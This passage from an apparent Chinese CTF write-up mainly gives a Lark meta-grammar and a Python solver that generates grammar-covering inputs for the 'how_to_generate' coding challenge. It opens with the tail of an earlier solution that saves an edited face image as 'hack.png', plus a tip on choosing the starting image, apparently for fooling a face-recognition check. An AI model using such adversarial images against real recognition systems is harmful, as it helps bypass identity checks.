    im = edit_image(im, face)
    Image.fromarray(im).save(<span class="hljs-string">&quot;hack.png&quot;</span>)</code></pre><p>另外，选一个好的初始图很重要。比赛时用奥巴马头像怎么训也不成功，换成某个女人头像很快就成功了。</p>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_fc728999b5840fb437781f0134ade2e6.png" alt=""></p>
<h3 id="how_to_generate"><a class="header-link" href="#how_to_generate"></a>how_to_generate</h3>
<p>服务器每次会随机生成一个上下文无关文法，我们要写程序自动生成一些AST，覆盖文法中所有生成规则。</p>
<p>我们可以写一个grammar来描述它的grammar，然后自动生成AST。</p>
<pre class="hljs"><code>%import common.LETTER
%import common.WORD
%import common.NUMBER
%import common.ESCAPED_STRING
%import common.DIGIT
%import common.WS
%ignore WS

<span class="hljs-symbol">start:</span> header+ rule+

<span class="hljs-symbol">header:</span> <span class="hljs-string">&quot;%&quot;</span> <span class="hljs-string">&quot;import&quot;</span> LETTER+ <span class="hljs-string">&quot;.&quot;</span> LETTER+
    | <span class="hljs-string">&quot;%&quot;</span> <span class="hljs-string">&quot;ignore&quot;</span> LETTER+

<span class="hljs-symbol">rule:</span> start_rule
    | name <span class="hljs-string">&quot;:&quot;</span> subrule (<span class="hljs-string">&quot;|&quot;</span> subrule)*

<span class="hljs-symbol">start_rule:</span> <span class="hljs-string">&quot;start:&quot;</span> <span class="hljs-string">&quot;statement+&quot;</span>

<span class="hljs-symbol">subrule:</span> part+ <span class="hljs-string">&quot;-&gt;&quot;</span> <span class="hljs-string">&quot;cov_&quot;</span> NUMBER

<span class="hljs-symbol">part:</span> s_letter
    | s_word
    | s_number
    | s_digit
    | s_expr
    | s_stmt
    | <span class="hljs-type">string</span>

<span class="hljs-symbol">s_letter:</span> <span class="hljs-string">&quot;LETTER&quot;</span>
<span class="hljs-symbol">s_word:</span> <span class="hljs-string">&quot;WORD&quot;</span>
<span class="hljs-symbol">s_number:</span> <span class="hljs-string">&quot;NUMBER&quot;</span>
<span class="hljs-symbol">s_digit:</span> <span class="hljs-string">&quot;DIGIT&quot;</span>
<span class="hljs-symbol">s_expr:</span> <span class="hljs-string">&quot;expression&quot;</span>
<span class="hljs-symbol">s_stmt:</span> <span class="hljs-string">&quot;statement&quot;</span>
<span class="hljs-symbol">string:</span> ESCAPED_STRING

<span class="hljs-symbol">name:</span> s_expr
    | s_stmt</code></pre><p>这就是个coding题。。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>
<span class="hljs-keyword">import</span> lark
<span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256


MIN_COV = <span class="hljs-number">30</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PartType</span>(<span class="hljs-params">Enum</span>):</span>
    LETTER = <span class="hljs-number">0</span>
    WORD = <span class="hljs-number">1</span>
    NUMBER = <span class="hljs-number">2</span>
    DIGIT = <span class="hljs-number">3</span>
    EXPRESSION = <span class="hljs-number">4</span>
    STATEMENT = <span class="hljs-number">5</span>
    STRING = <span class="hljs-number">6</span>


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Part</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, typ, data = <span class="hljs-literal">None</span></span>):</span>
        <span class="hljs-keyword">if</span> typ == PartType.STRING <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):
            <span class="hljs-keyword">raise</span> ValueError
        self.typ = typ
        self.data = data
    
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:</span>
        s = <span class="hljs-built_in">str</span>(self.typ)
        <span class="hljs-keyword">if</span> self.data <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            s += <span class="hljs-string">&quot; \&quot;%s\&quot;&quot;</span> % self.data
        <span class="hljs-keyword">return</span> s

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">complexity</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">if</span> self.typ == PartType.EXPRESSION:
            c = <span class="hljs-number">13.5</span>
        <span class="hljs-keyword">elif</span> self.typ == PartType.STATEMENT:
            c = <span class="hljs-number">42.73</span>
        <span class="hljs-keyword">elif</span> self.typ == PartType.STRING:
            c = <span class="hljs-built_in">len</span>(self.data)
        <span class="hljs-keyword">else</span>:
            c = <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(c)
    
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">expandable</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> self.typ == PartType.STATEMENT <span class="hljs-keyword">or</span> self.typ == PartType.EXPRESSION


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rule</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, parts: <span class="hljs-type">List</span>[Part], cov: <span class="hljs-built_in">int</span></span>):</span>
        self.parts = parts
        self.cov = cov

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self.parts) + <span class="hljs-string">&quot; -&gt; cov_%d&quot;</span> % self.cov

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">complexity</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([p.complexity() <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.parts])
    
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">expandable</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(p.expandable() <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.parts)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_gram</span>(<span class="hljs-params">in_gram</span>):</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;grammar&quot;</span>) <span class="hljs-keyword">as</span> f:
        gram = f.read()
    parser = lark.Lark(gram)
    <span class="hljs-keyword">return</span> parser.parse(in_gram)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_rules</span>(<span class="hljs-params">gram</span>):</span>
    <span class="hljs-keyword">assert</span> gram.data == <span class="hljs-string">&quot;start&quot;</span>
    expr_rules = []
    stmt_rules = []
    <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> gram.children:
        <span class="hljs-keyword">if</span> child.data != <span class="hljs-string">&quot;rule&quot;</span>:
            <span class="hljs-keyword">continue</span>
        rname = child.children[<span class="hljs-number">0</span>]
        <span class="hljs-keyword">if</span> rname.data == <span class="hljs-string">&quot;start_rule&quot;</span>:
            <span class="hljs-keyword">continue</span>
        rname = rname.children[<span class="hljs-number">0</span>].data
        <span class="hljs-keyword">if</span> rname == <span class="hljs-string">&quot;s_expr&quot;</span>:
            expr_rules = parse_rule(child.children)
        <span class="hljs-keyword">else</span>:
            stmt_rules = parse_rule(child.children)
    <span class="hljs-keyword">return</span> expr_rules, stmt_rules


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_rule</span>(<span class="hljs-params">ast</span>):</span>
    ans = []
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ast:
        <span class="hljs-keyword">if</span> x.data != <span class="hljs-string">&quot;subrule&quot;</span>:
            <span class="hljs-keyword">continue</span>
        r = parse_subrule(x)
        ans.append(r)
    <span class="hljs-keyword">return</span> ans


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_subrule</span>(<span class="hljs-params">ast</span>):</span>
    parts = []
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ast.children:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, lark.tree.Tree):
            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(x.children) == <span class="hljs-number">1</span>
            y = x.children[<span class="hljs-number">0</span>]
            <span class="hljs-keyword">if</span> y.data == <span class="hljs-string">&quot;s_expr&quot;</span>:
                part = Part(PartType.EXPRESSION)
            <span class="hljs-keyword">elif</span> y.data == <span class="hljs-string">&quot;s_stmt&quot;</span>:
                part = Part(PartType.STATEMENT)
            <span class="hljs-keyword">elif</span> y.data == <span class="hljs-string">&quot;s_word&quot;</span>:
                part = Part(PartType.WORD)
            <span class="hljs-keyword">elif</span> y.data == <span class="hljs-string">&quot;s_number&quot;</span>:
                part = Part(PartType.NUMBER)
            <span class="hljs-keyword">elif</span> y.data == <span class="hljs-string">&quot;s_digit&quot;</span>:
                part = Part(PartType.DIGIT)
            <span class="hljs-keyword">elif</span> y.data == <span class="hljs-string">&quot;s_letter&quot;</span>:
                part = Part(PartType.LETTER)
            <span class="hljs-keyword">elif</span> y.data == <span class="hljs-string">&quot;string&quot;</span>:
                data = y.children[<span class="hljs-number">0</span>].strip(<span class="hljs-string">&#x27;&quot;&#x27;</span>)
                part = Part(PartType.STRING, data)
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">raise</span> ValueError(y)
            parts.append(part)
    cov = <span class="hljs-built_in">int</span>(ast.children[-<span class="hljs-number">1</span>])
    <span class="hljs-keyword">return</span> Rule(parts, cov)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solver</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, expr_rules: <span class="hljs-type">List</span>[Rule], stmt_rules: <span class="hljs-type">List</span>[Rule]</span>):</span>
        self.expr_rules = expr_rules
        self.stmt_rules = stmt_rules
        self.expr_cov = [<span class="hljs-literal">False</span>] * <span class="hljs-built_in">len</span>(self.expr_rules)
        self.stmt_cov = [<span class="hljs-literal">False</span>] * <span class="hljs-built_in">len</span>(self.stmt_rules)
        self.count = <span class="hljs-number">0</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">all_cover</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(self.expr_cov) <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(self.stmt_cov)
    
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span>
        stmt_id = self.get_stmt_id(<span class="hljs-literal">True</span>)
        sol, anum = self.generate(self.stmt_rules[stmt_id], MIN_COV)
        <span class="hljs-comment">#print(sol)</span>
        <span class="hljs-keyword">return</span> sol
    
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_rule_id</span>(<span class="hljs-params">rules, cov, expand</span>):</span>
        rid = <span class="hljs-literal">None</span>
        n = <span class="hljs-built_in">len</span>(rules)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
            <span class="hljs-keyword">if</span> expand <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> rules[i].expandable():
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cov[i]:
                rid = i
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">if</span> rid <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">if</span> expand:
                rid = random.choice([i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n) <span class="hljs-keyword">if</span> rules[i].expandable()])
            <span class="hljs-keyword">else</span>:
                rid = random.choice(<span class="hljs-built_in">range</span>(n))
        cov[rid] = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> rid

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_stmt_id</span>(<span class="hljs-params">self, expand</span>):</span>
        <span class="hljs-keyword">return</span> Solver.get_rule_id(self.stmt_rules, self.stmt_cov, expand)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_expr_id</span>(<span class="hljs-params">self, expand</span>):</span>
        <span class="hljs-keyword">return</span> Solver.get_rule_id(self.expr_rules, self.expr_cov, expand)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span>(<span class="hljs-params">self, rule: Rule, cnum: <span class="hljs-built_in">int</span></span>):</span>
        code = <span class="hljs-string">&quot;&quot;</span>
        anum = <span class="hljs-number">1</span>
        <span class="hljs-comment">#print(&quot;gen&quot;, cnum, rule)</span>
        <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> rule.parts:
            <span class="hljs-keyword">if</span> part.typ == PartType.DIGIT <span class="hljs-keyword">or</span> part.typ == PartType.NUMBER:
                s = random.choice(string.digits)
            <span class="hljs-keyword">elif</span> part.typ == PartType.LETTER <span class="hljs-keyword">or</span> part.typ == PartType.WORD:
                s = random.choice(string.ascii_letters)
            <span class="hljs-keyword">elif</span> part.typ == PartType.STRING:
                s = part.data
            <span class="hljs-keyword">elif</span> part.typ == PartType.EXPRESSION:
                expr_id = self.get_expr_id(anum + <span class="hljs-number">1</span> &lt; cnum)
                s, _anum = self.generate(self.expr_rules[expr_id], cnum - anum)
                anum += _anum
            <span class="hljs-keyword">elif</span> part.typ == PartType.STATEMENT:
                stmt_id = self.get_stmt_id(anum + <span class="hljs-number">1</span> &lt; cnum)
                s, _anum = self.generate(self.stmt_rules[stmt_id], cnum - anum)
                anum += _anum
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">raise</span> ValueError
            <span class="hljs-comment">#print(s, part)</span>
            code += s + <span class="hljs-string">&quot; &quot;</span>
        <span class="hljs-comment">#print(anum, cnum)</span>
        <span class="hljs-comment">#print(&quot;rule&quot;, rule)</span>
        <span class="hljs-keyword">assert</span> anum &gt;= cnum
        <span class="hljs-keyword">return</span> code, anum


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proof</span>(<span class="hljs-params">r</span>):</span>
    line = r.recvline().decode().strip()
    part = line[line.find(<span class="hljs-string">&quot;+&quot;</span>)+<span class="hljs-number">1</span>:line.find(<span class="hljs-string">&quot;)&quot;</span>)]
    h = line[line.find(<span class="hljs-string">&quot;==&quot;</span>)+<span class="hljs-number">2</span>:].strip()
    <span class="hljs-built_in">print</span>(line)
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        s = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.digits+string.ascii_letters) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))
        h1 = sha256((s+part).encode()).hexdigest()
        <span class="hljs-keyword">if</span> h1 == h:
            r.recvuntil(<span class="hljs-string">&quot;Give&quot;</span>)
            r.sendline(s)
            <span class="hljs-keyword">break</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">collect_cov</span>(<span class="hljs-params">ast</span>):</span>
    cov = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(ast, lark.tree.Tree):
        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> ast.children:
            cov |= collect_cov(ch)
        <span class="hljs-keyword">if</span> ast.data.startswith(<span class="hljs-string">&#x27;cov_&#x27;</span>):
            num = <span class="hljs-built_in">int</span>(ast.data[<span class="hljs-number">4</span>:])
            cov |= (<span class="hljs-number">1</span>&lt;&lt;num)
    <span class="hljs-keyword">return</span> cov


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">local</span>):</span>
    <span class="hljs-keyword">if</span> local:
        r = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">10002</span>)
    <span class="hljs-keyword">else</span>:
        r = remote(<span class="hljs-string">&quot;121.5.253.92&quot;</span>, <span class="hljs-number">10001</span>)
        proof(r)

    r.recvuntil(<span class="hljs-string">&quot;today:&quot;</span>)
    gram0 = r.recvuntil(<span class="hljs-string">&quot;EOF&quot;</span>, drop=<span class="hljs-literal">True</span>)
    gram0 = gram0.decode()
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:
        f.write(gram0)
    parser0 = lark.Lark(gram0)    

    gram = parse_gram(gram0)
    expr_rules, stmt_rules = parse_rules(gram)

    codes = <span class="hljs-built_in">set</span>()
    solver = Solver(expr_rules, stmt_rules)
    N = <span class="hljs-number">0x1000</span>
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(codes) &lt; N:
        sol = solver.run()
        ast = parser0.parse(sol)
        cov = collect_cov(ast)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">bin</span>(cov).count(<span class="hljs-string">&quot;1&quot;</span>) &gt;= <span class="hljs-number">20</span>:
            codes.add(sol)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-built_in">len</span>(codes))
    <span class="hljs-keyword">assert</span> solver.all_cover()

    MAXSIZE = <span class="hljs-number">0x200000</span>
    code = <span class="hljs-string">&quot;|&quot;</span>.join(<span class="hljs-built_in">list</span>(codes))
    code = zlib.compress(code.encode())
    size = <span class="hljs-built_in">len</span>(code)
    <span class="hljs-keyword">assert</span> size &lt; MAXSIZE
    code = code.<span class="hljs-built_in">hex</span>()

    <span class="hljs-comment">#context.log_level = &quot;debug&quot;</span>
    r.recvuntil(<span class="hljs-string">&quot;size&quot;</span>)
    r.sendline(<span class="hljs-built_in">str</span>(size))
    r.recvuntil(<span class="hljs-string">&quot;code(hex): &quot;</span>)
    r.sendline(code)
    flag = r.recvall().decode()
    r.close()
    <span class="hljs-keyword">return</span> flag


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        flag = solve(local=<span class="hljs-literal">True</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;fail&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> flag:
            <span class="hljs-built_in">print</span>(flag)
            <span class="hljs-keyword">break</span></code></pre>        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
